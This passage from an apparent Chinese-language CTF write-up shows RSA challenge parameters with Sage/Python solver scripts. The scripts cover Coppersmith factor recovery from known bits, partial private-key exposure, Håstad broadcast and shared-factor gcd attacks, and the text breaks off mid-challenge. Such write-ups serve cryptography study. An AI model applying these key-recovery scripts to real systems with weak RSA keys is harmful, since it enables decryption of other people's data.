operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x241ac918f708fff645d3d6e24315e5bb045c02e788c2b7f74b2b83484ce9c0285b6c54d99e2a601a386237d666db2805175e7cc86a733a97aeaab63486133103e30c1dca09741819026bd3ea8d08746d1d38df63c025c1793bdc7e38d194a30b492aadf9e31a6c1240a65db49e061b48f1f2ae949ac9e7e0992ed24f9c01578dL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">65537</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x1922e7151c779d6bb554cba6a05858415e74739c36df0bcf169e49ef0e566a4353c51a306036970005f2321d1d104f91a673f40944e830619ed683d8f84eaf26e7a93c4abe1dbd7ca3babf3f4959def0e3d87f7818d54633a790fc74e9fed3c5b5456c21e3f425240f6217b0b14516cb59aa0ce74b83ca17d8cc4a0fbc829fb8L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">>></span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">=</span>0x2c1e75652df018588875c7ab60472abf26a234bc1bfc1b685888fb5ded29ab5b93f5105c1e9b46912368e626777a873200000000000000000000000000000000L</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#from sage.all import *</span><span class="token comment" spellcheck="true">#import binascii</span>n <span class="token operator">=</span> <span class="token number">0x68f56087cddf01e39e938d40df9a28bc9e5579d19d2763e7361ee464ae79e503d99a1c07eeec8c95cd928eb1ce41e0ba01bed85c45b2c0bc3c8ec04327f702d28f2983e9a8672c11cbb4a53279f22666ad5e6329d3ca32607f2d1b14f79315df440be17e254a59f614fb0bee9d49f3706c8dd67427cf7cc542324e15cbe27657</span>p4 <span class="token operator">=</span><span class="token number">0xedbe4e8eb2ba136c89848560f57b081e6e49a2ae7457ff5093b6b7182f484453fe8b1b51bb207618af5d5d06dc16c099</span>cipher <span class="token operator">=</span> 0x109824d42a3b891f9a6f3c21efa09cf01f59ad8d8b85953a515e4fd9799e72cce08328a200b17fb901508b0395964936e35fb698be4ab3fc275255bb2aaa49a6546df3f8963b543e2759c6ab517f9c1b4a0d9e3eba1a09ce35fec8025d286e56d7bbde2e2fa7b05402857b2425ff9a27034c9c04ccf703ba562ccf0726be2fe5Le2 <span class="token operator">=</span> <span class="token number">65537</span>pbits <span class="token operator">=</span> <span class="token number">512</span>kbits <span class="token operator">=</span> pbits <span class="token operator">-</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> p4<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> p4 <span class="token operator">&lt;&lt;</span> kbitsPR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> x <span class="token operator">+</span> p4roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span><span class="token keyword">if</span> roots<span class="token punctuation">:</span>    p <span class="token operator">=</span> p4<span class="token operator">+</span>int<span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"p: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> n <span class="token operator">%</span> p <span class="token operator">==</span> <span class="token number">0</span>    q <span class="token operator">=</span> n<span class="token operator">/</span>int<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"q: "</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>int<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span>    phin <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> gcd<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span>e2<span class="token punctuation">,</span>phin<span class="token punctuation">)</span>    flag <span class="token operator">=</span> pow<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 191445a91032bc5eb2f1ffc6db4db109b3c46e5b1d3cf92279d63712c7ae16725db646496b02c6a04c648e46bdc8430d82f39a240323fca0cc1ab38b16e5c107</span></code></pre><h2 id="✅Challenge-3"><a href="#✅Challenge-3" class="headerlink" title="✅Challenge 3"></a>✅Challenge 3</h2><p>已知部分私钥，但私钥高比特未知，Partial Key Exposure Attack(部分私钥暴露攻击)。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x3d7e16fd8b0b1afdb4e12594c3d8590f1175800ef07bb275d7a8ad983d0d5d5fd5c6f81efa40f5d10c48bb200f805e679d633ee584748e5feef003e0921dea736ba91eef72f3d591d3a54cd59fd36f61140fdd3fb2e2c028b684e50cbeae4a1f386f6ab35359d46a29996c0f7d9a4a189f1096150496746f064c3cc41cf111b0L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span>0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span>d <span class="token operator">=</span> 0x36a7780f1c08f66d7563a8fdbae2401c4e5eb8d97452b056fcadde216b2d6fd27abbbf38a37b7e742d4ab7cf04cc6f03e9fd64dbaa060c85af51a55ea733fd2017c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">partial_p</span><span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    f <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x <span class="token operator">+</span> p0    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token punctuation">(</span>nbits<span class="token operator">//</span><span class="token number">2</span><span class="token operator">-</span>kbits<span class="token punctuation">)</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^(nbits//2-kbits) with factor >= n^0.3</span>    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>        x0 <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token operator">*</span>x0 <span class="token operator">+</span> p0<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">return</span> ZZ<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">find_p</span><span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    X <span class="token operator">=</span> var<span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        results <span class="token operator">=</span> solve_mod<span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token operator">*</span>d0<span class="token operator">*</span>X <span class="token operator">-</span> k<span class="token operator">*</span>X<span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span>X<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token operator">*</span>n <span class="token operator">==</span> X<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>            p0 <span class="token operator">=</span> ZZ<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> partial_p<span class="token punctuation">(</span>p0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            <span class="token keyword">if</span> p<span class="token punctuation">:</span>                <span class="token keyword">return</span> p<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># n = 0x51fb3416aa0d71a430157d7c9853602a758e15462e7c08827b04cd3220c427bbb8199ed4f5393dae43f013b68732a685defc17497f0912c886fa780dfacdfbb1461197d95a92a7a74ade874127a61411e14a901382ed3fb9d62c040c0dbaa374b5a4df06481a26da3fca271429ff10a4fc973b1c82553e3c1dd4f2f37dc24b3bL</span>    e <span class="token operator">=</span> <span class="token number">3</span>    <span class="token comment" spellcheck="true"># d = 0x17c4b18f1290b6a0886eaa7bf426485a3994c5b71186fe84d5138e18de7e060db57f9580381a917fdfd171bfd159825a7d1e2800e2774f5e4449d17e6723749bL</span>    n <span class="token operator">=</span> <span class="token number">57569201048993475052349187244752169754165154575782760003851777813767048953051839288528137121670999884309849815765999616346303792471518639080697166767644957046582385785721102370288806038187956032505761532789716009522131450217010629338000241936036185205038814391205848232364006349213836317806903032515194407739</span>    nbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> floor<span class="token punctuation">(</span>nbits<span class="token operator">*</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"kbits : "</span><span class="token punctuation">,</span> kbits     d0 <span class="token operator">=</span> <span class="token number">1244848677959253796774387650148978357579294769878147704641867595620534030329181934099194560059806799908134954814673426128260540575360296026444649631806619</span>    <span class="token keyword">print</span> <span class="token string">"lower %d bits (of %d bits) is given"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>kbits<span class="token punctuation">,</span> nbits<span class="token punctuation">)</span>    p <span class="token operator">=</span> find_p<span class="token punctuation">(</span>d0<span class="token punctuation">,</span> kbits<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"found p: %d"</span> <span class="token operator">%</span> p    q <span class="token operator">=</span> n<span class="token operator">//</span>p    <span class="token comment" spellcheck="true"># print d</span>    <span class="token keyword">print</span> inverse_mod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># m = 856119b6bdb17543c2089fefb23173e6cf6aff2d0c755760ac97fb9b3ca869a0875b5052f5a4dcef4c64c76ae97de9897398a79b291a851f2ebffef6dde90fdf</span></code></pre><h2 id="✅Challenge-4"><a href="#✅Challenge-4" class="headerlink" title="✅Challenge 4"></a>✅Challenge 4</h2><p>给出三组(n,c)，采用低指数广播攻击。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">4</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n1<span class="token operator">=</span>0x4b25bd834da788533ebef06f552bc8230024d1a571226770bd93bad3b202af4de7f680252a61cc423b3143db075196d6c282e71e84a3f3fe582c69c822389ddf76a86f9169334868119a884b8185c4ee559a3540141c785f2a9e1d59e3c828b26fc785ae4b578da073a39000fbaca6f30807a6110079dc64693dd1089835ea0bL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c1<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token operator">=</span>0x5e6a4b86018060a6c38952cfd450695ca90444c51d4e0de4690dbadd5000f7bb62e752bbd70c27f342792cc669f0d650b0c8e31b233963c32ebc2297d5aae650a8be7ba5a49319cc010ea8333de09fb4ae9e25af4cce79afcaad80263fbb02329dadb49bfb5f87791c9d29e52103f0153a200f7a11b00086c3c7ae6bbc30269L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n2<span class="token operator">=</span>0x2388ddafc70ba72e181857376f3b23bf6b95c5f721a05e5e499caed0ee81a40031223718156752eef2c7535d8d8d0224126975492f8f002ca98d923ba3f05bff14eac24fb35dd50683cadc3ae0fa55ac368ebe5eb4ecfeb48ada4d785d7c64524783ef50a7c599a27b6a2afa9e1c1a41c6aba40dfd316eef4dc6718eba2af1c5L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c2<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token operator">=</span>0x71c907c67faf78314ff0332a7fe1d23fd6c9d788425affd54b851c805327fe363c340b047b555f356b1d8b6a930cb22a2e2eb3eb492ab4b307bc782c34fe1dfd032a2d838a80fbf8f6990baa4c712bc9f3bcae964806d418301cd25bc35c0d07a3fc24b25ecc527d3bfafaa5c6ffcf171446238925a76039a2aadc557efb871L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n3<span class="token operator">=</span>0x33e9cbd05b84dc1e5d314656c937c2225351bd0573a5d2d8db357db8afb65be91b0362f8c1b9bbaab51c23decfff77cf8160e260c3374c2fd5b69d1a64cdddb5bd6e37e049e4a657d4a239177b9ec23a873ae272861567b8ea000880d0ba8e7f0449de97f955a78e78e7c8a3becbf3adb6825326786d98ecc30d34be67b5be69L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c3<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n3<span class="token punctuation">)</span><span class="token operator">=</span>0x37bf32f9bfd3afc668b2fb4f48ab3e888bbc204eda2dd05af8dc08974698aa7808cb8623ee16cb17ccc9e27de90d283569390f1ea155a645e46a47f4a1c147d139b631219a94ea3fcac314515a112c7e673ddf594482eec00c0ec8c46dbf4bc4532c19a5dcdbc0a1c8882937b5546653e73c047473df8aa350d876c7a62f60fL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">broadcast</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2 <span class="token punctuation">,</span>n3<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> <span class="token punctuation">[</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">,</span> n3<span class="token punctuation">]</span>    C <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">]</span>    N <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        N <span class="token operator">*=</span> i    Ni <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        Ni<span class="token punctuation">.</span>append<span class="token punctuation">(</span>N <span class="token operator">/</span> i<span class="token punctuation">)</span>    T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>append<span class="token punctuation">(</span>long<span class="token punctuation">(</span>invert<span class="token punctuation">(</span>Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    X <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        X <span class="token operator">+=</span> C<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    m3 <span class="token operator">=</span> X <span class="token operator">%</span> N    m <span class="token operator">=</span> iroot<span class="token punctuation">(</span>m3<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>m <span class="token operator">=</span> hex<span class="token punctuation">(</span>broadcast<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><p>若是给出两组n的话，直接可以采用求两个n的公约数的方法进行攻击。</p><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># from libnum import gcd</span><span class="token comment" spellcheck="true"># n1=0xb4e9991d2fac12b098b01118d960eb5470261368e7b1ff2da2c66b4302835aa845dd50a4f749fea749c6d439156df6faf8d14ce2a57da3bac542f1843bfc80dfd632e7a2ef96496a660d8c5994aea9e1b665097503558bc2756ab06d362abe3777d8c1f388c8cd1d193955b70053382d330125bdc2cdc836453f1a26cec1021cbb787977336b2300f38c6ba881a93d2a2735f8f0d32ea2d0e9527eb15294dd0867c8030d1f646bd121c01706c247cd1bf4aa209d383ffb748b73ec1688dc71812675834b4b12d27a63b5b8fcc47394d16897ff96af49f39d8d5b247553fbf8fac7be08aab43d9ce5659cd5cfaf7d73edbcfe854d997ae4b28d879adf86641707</span><span class="token comment" spellcheck="true"># #  e1=0x10001</span><span class="token comment" spellcheck="true"># #  c1=0x3a10c58ed3e8f9eade48dad7d36518dabeeca3d169c848f3b4b2bb027220e13d8b071c55046b14213e966ad9c381e5cad9773d455aa0d36ddff9b9f24873d0979f1caff95d9569e4f312514c7e01979b39c466aa2d27ad521ae3c1ea2025ca2290185b3d79da4f6e4c7e77a70f206bd5c41eec65fd64f86c317b8207ca511b8297b597cb9c24afa652c1f1c7f2d8ca61cf4a63b17df165e4c02dc19578305f276cb81fdfadf0ffc8b86e13297f2692edf7e6324878bb8ca960a050af6b0ada8ba4accd72c7d2c74a41e98d801093e4cc5b1572b8e6be9f270c30759543986180bb4fc6863e14638ea74863dbdd1624cfdedaedb99dfd48901e7d4b486a7b13ea</span><span class="token comment" spellcheck="true"># n2=0xc31344c753e25135d5eed8febaa57dd7020b503a5569bdd4ae6747b5c36436dc1c4d7ead77bfc1034748bcc630636bae1c8f4ca5dee8246b3d6f3e8b14e16487733b14ec8e587e07a7a6de45859d32d241eaf7746c45ff404f1a767ab77e8493ae8141fee0bcf4e9b7c455415b6945fa60de928b01dfa90bbf0d09194f93db7a1663121d281c908f0e38237f63c2b856f99c6029d993f9afb5fbbb762044d97943ff34023486c4cf1db9ffdc439d9f5ff331b606374c7133d61e4614fac3ea7faaf54563338b736282658e7925b224577091831351a28679a8d6f8e7ba16685b2769bb49b79f8054b29c809d68aca0f2c5e3f1fd0e3ef6c21f756e3c44a40439</span><span class="token comment" spellcheck="true"># # e2=0x10001</span><span class="token comment" spellcheck="true"># # c2=0xbefa7d62f15cafc81d098fdd524411537e948d83266ef22848f44d2e43d1f1388a26bb21c8fb08b571c7cbd6630d6f2b409c85c68a6419e472941e4978f60b93e1ce850344dbe99f1918cb5b8c35075bbdca82fa233d1300f108e4b75ce10d7b0ffa145bceffbc7a5204bf9c119f77af191091f25140aedcdd333b631b240ddad3108c96084dffe6e49e04880908fa02c02edb58e2f27919d707151adb6787384ca28050f8d77418cc1733187d7695f57127be8d6174562723679ba39790d7f2306271b9d8f4d2bdde9ed798af00074ec7da3a7f1ffeb4fc6a61804e51c0f92d384dc62b80fd44492588af26ac0185a23f86c46a7ffdec9fcf31b02b08b63001</span><span class="token comment" spellcheck="true"># print "p -> {}".format(gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q1 -> {}".format(n1 / gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q2 -> {}".format(n2 / gcd(n1, n2))</span>q <span class="token operator">=</span> <span class="token number">161993393900030566867150602363721535479433489542726899362944130872107225598993516228193877689420023695231584876954537089973673478074348422697619820309397363583748523503035462772765277978491082324620122838540365168604124924805412323471486221429513024367107238770298040268787441768635257727315317704741778501737</span>p1 <span class="token operator">=</span> <span class="token number">92392842076088454558676873885205432277688794102622657192126179753576488966439636785821047115301443362169549898465575056742381428321997570097374526363913597739756884031644135343404225885226264566916462715686341654211514913366341960827374747754358972050549971216117165750261475461979495685882564817634194301271</span>p2 <span class="token operator">=</span> <span class="token number">90279376687119715076904357810855212347782022402759254635072438787841245581930716927541800564582197695494423401147385731042364986596482750220701857807271816829238846312998439918616452075752787878425283820635199121653984306111110530896331011530772771558835563313746863033189248831495407320154948117671577602867</span><span class="token comment" spellcheck="true">#p=getPrime(1024)</span><span class="token comment" spellcheck="true">#q=getPrime(1024)</span>e<span class="token operator">=</span><span class="token number">65537</span>n<span class="token operator">=</span>p1<span class="token operator">*</span>qc <span class="token operator">=</span> <span class="token number">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span>fn <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token number">3966878437245643631637564975732704690837306124446086877872976205025646385675581853511438558449272831057566720069483322716185302889500282616707242022434828280064159692586323031389171478503753908040157812124377949328353938367107704570961998942943251122002994862593199357765354157601632561816952286250637771656438228389552713018311110406430345367091645709437632368795499521650765928713846948596775009799649123556193038678824282362527557831582015129491351042998117090300454963836491928898672785463727735926420386710315758459309854603319606229977802586942578329763497502143858265135463947731426008988290087504887177240673</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><h2 id="❎Challenge-5"><a href="#❎Challenge-5" class="headerlink" title="❎Challenge 5"></a>❎Challenge 5</h2><p>已知n和两个cipher，并且是由m和m+1加密而来。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">5</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>x<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token 